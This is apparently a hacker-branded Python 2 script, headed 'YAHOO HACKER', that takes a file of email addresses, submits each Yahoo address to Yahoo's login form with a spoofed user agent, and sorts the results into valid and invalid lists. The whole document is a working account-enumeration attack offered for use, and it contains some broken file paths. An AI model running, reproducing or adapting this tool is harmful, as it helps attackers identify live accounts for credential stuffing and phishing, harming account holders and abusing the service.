import os, sys, mechanize, re
from requests.exceptions import ConnectionError

DEFAULT = "\033[0;37m"
DG = "\033[1;30m"
R = "\033[1;31m"
G = "\033[1;32m"
Y = "\033[1;33m"
B = "\033[1;34m"
M = "\033[1;35m"
C = "\033[1;36m"
W = "\033[1;37m"

try:
   os.mkdir("output")
except:
   pass

br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def banner():
   os.system("clear")

   print W +"  ___    ___ "
   print " ( _<    >_ ) "
   print " //        \\\ "
   print " \\\___..___// "
   print W +"  `-(    )-'         "+R+"{ "+W+"YAHOO HACKER "+R+"} "
   print W +"    _|__|_ "
   print "   /_|__|_\ "
   print "   /_|__|_\ "
   print "   /_\__/_\ "
   print W +"    \ || /  _)       "+R+"[ "+W+"Coded by  "+R+": "+Y+"./Ali-MOHAMAD.          "+R+"] "
   print W +"      ||   ( )       "+R+"[ "+W+"Info      "+R+": "+W+"Syrian Hacker_2020     "+R+"] "
   print W +"      \\\___// "
   print "       `---' "
   print "==============================================================          "
   print "   [-- ALI-MOHAMAD : Facebook & youtube & Github --]         "
   print "     https://www.facebook.com/ALi20Hack          "
   print "     https://github.com/Ali20hack          "
   print "     https://www.youtube.com/channel/UCkOu7kHM1aJkJw87d2FlG9Q          "
   print "==============================================================          "
   print "             "


def yahoolist():

    files = raw_input('Your file ' + R + '> '+ W)
    try:
         total = open(files, 'r').readlines()
    except IOError:
         print R + '['+ W +'!'+ R +'] '+ W +'File not found'
         exit()

    save = open('ALi/ALi-NO.txt', 'w')
    save2 = open('Ali/ALi-OK.txt', 'w')
    mail = open(files, 'r').readlines()
    for pw in mail:
        mail = pw.replace('\n', '')
        yahoo = re.compile('@.*')
        otw = yahoo.search(mail).group()
        if 'yahoo.com' in otw:
            br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
            br._factory.is_html = True
            br.select_form(nr=0)
            br['username'] = mail
            klik = br.submit().read()
            jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
            try:
                pek = jok.search(klik).group()
            except:
                print W + '[ ' + G + 'VALID ' + W + '] ' + mail
                save2.write(mail + '\n')
                continue

            if '"messages.ERROR_INVALID_USERNAME">' in pek:
                save.write(mail + '\n')
                print W + '[ ' + R + 'INVALID ' + W + '] ' + mail
            else:
                print W + '[ ' + G + 'GATAU ' + W + '] ' + mail

    print 'Program finished'
    print 'Data saved ALi-OK.txt & ALi-NO.txt'
    save.close()
    save2.close()

banner()
yahoolist()
